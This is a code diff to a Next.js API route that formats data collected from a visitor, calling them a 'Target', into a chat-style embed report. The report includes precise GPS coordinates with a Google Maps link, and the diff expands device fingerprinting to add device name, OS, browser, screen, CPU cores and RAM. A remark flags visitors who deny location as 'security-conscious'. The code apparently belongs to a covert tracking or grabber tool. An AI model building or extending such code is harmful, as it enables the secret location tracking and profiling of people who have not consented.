@@ -27,9 +27,9 @@ export async function POST(request: NextRequest) {
           inline: false
         },
         {
-          name: "\ud83d\udccd Location Data",
+          name: "📍 Location Data",
           value: data.latitude ? 
-            `**Lat:** ${data.latitude.toFixed(6)}\n**Lng:** ${data.longitude.toFixed(6)}\n**Accuracy:** \u00b1${data.accuracy.toFixed(0)}m\n[View on Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})` :
+            `**Lat:** ${data.latitude.toFixed(6)}\n**Lng:** ${data.longitude.toFixed(6)}\n**Accuracy:** ±${data.accuracy.toFixed(0)}m\n[View on Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})` :
             `**Status:** Location access denied\n**Note:** Target was security-conscious`,
           inline: true
         },
@@ -39,8 +39,13 @@ export async function POST(request: NextRequest) {
           inline: true
         },
         {
-          name: "💻 Device Fingerprint",
-          value: `**Platform:** ${data.platform}\n**Screen:** ${data.screenResolution}\n**Timezone:** ${data.timezone}`,
+          name: "📱 Device Fingerprint",
+          value: `**Device:** ${data.deviceInfo?.deviceName || 'Unknown'}\n**Type:** ${data.deviceInfo?.deviceType}\n**OS:** ${data.deviceInfo?.operatingSystem}\n**Browser:** ${data.deviceInfo?.browser} ${data.deviceInfo?.browserVersion}`,
+          inline: true
+        },
+        {
+          name: "🔧 Hardware Details",
+          value: `**Screen:** ${data.deviceInfo?.screenDetails.resolution}\n**Pixel Ratio:** ${data.deviceInfo?.screenDetails.pixelRatio}x\n**CPU Cores:** ${data.deviceInfo?.hardwareDetails.cores}\n**RAM:** ${data.deviceInfo?.hardwareDetails.memory}\n**Touch:** ${data.deviceInfo?.hardwareDetails.touchSupport ? 'Yes' : 'No'}`,
           inline: true
         },
         {
